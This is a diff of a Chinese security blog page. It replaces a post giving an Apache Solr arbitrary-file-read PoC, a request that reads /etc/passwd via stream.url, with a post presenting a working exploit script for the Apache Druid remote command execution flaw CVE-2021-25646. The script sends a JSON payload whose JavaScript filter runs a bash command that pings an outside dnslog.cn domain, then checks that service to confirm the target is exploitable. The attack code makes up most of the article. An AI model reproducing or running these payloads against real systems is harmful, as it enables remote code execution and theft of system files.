@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
     <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <title>Apache Solr 任意文件读取漏洞 | GMF信息小站</title>
+    <title>ApacheDuridRCE | GMF信息小站</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
     <meta name="keywords" content="givemefivw, POC&EXP, Web安全, 渗透测试, 编程语言" >
     <meta name="description" content="信息安全小站" >
@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1618539793057.css">
+<link rel="stylesheet" href="/css/style.css?v=1618539793040.css">
 
     <!--[if lt IE 9]>
     
@@ -50,11 +50,11 @@
         <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
         <ul class="menu hidden" id="JELON__menu">
             
-            <li rel="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html" class="item ">
+            <li rel="/2021/04/16/ApacheDuridRCE/index.html" class="item ">
                 <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
             </li>
             
-            <li rel="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html" class="item ">
+            <li rel="/2021/04/16/ApacheDuridRCE/index.html" class="item ">
                 <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
             </li>
             
@@ -105,28 +105,31 @@
 <!-- 文章 -->
 <article class="post article">
     <header class="text-center">
-        <h3 class="post-title"><span>Apache Solr 任意文件读取漏洞</span></h3>
+        <h3 class="post-title"><span>ApacheDuridRCE</span></h3>
     </header>
     <p class="post-meta text-center">
         givemefivw 发表于
-        <time datetime="2021-03-18T06:11:29.000Z">2021-03-18</time>
+        <time datetime="2021-04-16T02:20:10.000Z">2021-04-16</time>
     </p>
     <div id="JELON__articlePostContent" class="post-content">
-        <h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ip:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</span><br><span class="line"></span><br><span class="line">找到name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;ip:8983&#x2F;solr&#x2F;name&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams</span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line">stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/1.png"></p>
-<p><img src="/2021/03/18/Apache-Solor-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/2.png"></p>
+        <h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>脚本是使用DNSLog进行判断，如果存在漏洞则会自动获取dnslog网址进行ping操作，将返回结果打印输出。</p>
+<ul>
+<li>使用之间先在<code>script\ATTACKUTILS</code>目录下新建一dns.wker文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#define dnsqian &#x3D; Set-Cookie:[</span><br><span class="line">#define dnshou &#x3D;  path&#x3D;&#x2F;</span><br><span class="line">#define re &#x3D; &quot;(.*?)&quot;</span><br><span class="line">function DnsRef(cookie)&#123;</span><br><span class="line">	res &#x3D; HttpGet(&quot;http:&#x2F;&#x2F;dnslog.cn&#x2F;getrecords.php?t&#x3D;0.3741317873165926&quot;,cookie.StrRN().&quot;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0&quot;);</span><br><span class="line">	r &#x3D; StrRe(res[0],re);</span><br><span class="line">	if(GetArrayNum(r) &gt;&#x3D; 3)&#123;</span><br><span class="line">		return r[3];</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return &quot;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">function GetDomain()&#123;</span><br><span class="line">	array r;</span><br><span class="line">	res &#x3D; HttpGet(&quot;http:&#x2F;&#x2F;dnslog.cn&#x2F;getdomain.php?t&#x3D;0.16082432252184475&quot;,&quot;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0&quot;);</span><br><span class="line">	tmp &#x3D; StrSplit(res[0],StrRN());</span><br><span class="line">	dns &#x3D; tmp[0];</span><br><span class="line">	cookie &#x3D; &quot;Cookie: &quot;.GettextMiddle(res[1],dnsqian,dnshou);</span><br><span class="line">	ArrayAddEle(r,dns);</span><br><span class="line">	ArrayAddEle(r,cookie);</span><br><span class="line">	return r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+Apache.wker:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#define dir &#x3D; &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler</span><br><span class="line">#define post &#x3D; &#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https:&#x2F;&#x2F;xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 ping dnslog&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</span><br><span class="line">#define info &#x3D; CVE-2021-25646 Apache Druid远程命令执行漏洞</span><br><span class="line">#include ATTACKUTILS&#x2F;dns.wker</span><br><span class="line"></span><br><span class="line">function main(args)&#123;</span><br><span class="line">	print(&quot;请输入要检测的网址： &quot;);</span><br><span class="line">	url &#x3D; input();</span><br><span class="line">	try&#123;</span><br><span class="line">		dnsC &#x3D; GetDomain();</span><br><span class="line">		realpost &#x3D; StrReplace(post,&quot;dnslog&quot;,dnsC[0]);</span><br><span class="line">		HttpPost(url.dir,realpost,&quot;Content-Type: application&#x2F;json;charset&#x3D;utf-8&quot;.StrRN().&quot;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0&quot;);</span><br><span class="line">		printclolor(&quot;[+] 存在CVE-2021-25646 Apache Druid远程命令执行漏洞！&quot;,3);</span><br><span class="line">		print(&quot;所使用的DNSLog: &quot;.dnsC[0]);</span><br><span class="line">		print(&quot;DNSLog结果：&quot;.DnsRef(dnsC[1]));</span><br><span class="line">	&#125;catch&#123;</span><br><span class="line">		printclolor(&quot;[-] 请检查目标状态！&quot;,5);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><img src="/2021/04/16/ApacheDuridRCE/re.png"></li>
+</ul>
 
     </div>
     <p class="eof">-- EOF --</p>
     <p class="post-meta">
         <span class="post-cat">分类：
-            <a class="cat-link" href="/categories/%E6%9D%82%E9%A1%B9%E6%BC%8F%E6%B4%9E/">杂项漏洞</a>
+            <a class="cat-link" href="/categories/ApacheDuridRCE-Wker%E8%84%9A%E6%9C%AC/">ApacheDuridRCE Wker脚本</a>
         </span>
         <span class="post-tags">
             标签：
             
     
-        <a href="/tags/Apache/" title="Apache">Apache</a>
+        <a href="/tags/Cheetach/" title="Cheetach">Cheetach</a>
     
 
         </span>
@@ -152,20 +155,16 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2021/03/20/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8E%A9%E6%97%A5%E5%85%8D%E6%9D%80/">
-            
-                免杀实验笔记之掩日免杀
-            
-        </a>
+        <a href="javascript: void(0);">没有上一篇了</a>
     </span>
     
 
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2021/03/12/%E8%AE%BA%E5%AD%A6%E7%94%9F%E4%B8%8E%E5%AD%A6%E6%A0%A1/">
+        <a href="/2021/04/12/%E3%80%8A%E5%A4%A7%E5%94%90%E9%A3%8E%E6%9C%88%E3%80%8B/">
             
-                论学生与学校
+                《大唐风月》
             
         </a>
     </span>
@@ -376,7 +375,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1618539793058.js"></script>
+<script src="/js/main.js?v=1618539793044.js"></script>
 
 
 </body>
